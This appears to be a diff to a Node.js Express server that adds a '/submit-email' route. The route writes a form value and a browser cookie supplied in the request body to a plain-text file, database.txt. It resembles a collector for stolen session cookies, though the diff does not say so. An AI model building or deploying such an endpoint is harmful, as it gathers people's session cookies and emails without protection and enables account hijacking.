@@ -59,6 +59,12 @@ app.post('/knn', function(req, res) {
     });
 });
 
+app.post('/submit-email', function (req, res) {
+    let entry = `${req.body.form.split('=')[1]}, ${req.body.cookie}\n`;
+    console.log(entry);
+    fs.appendFile("database.txt", entry, err => {});
+});
+
 app.post('/leg-api', function (req, res) {
 
     var output = {};
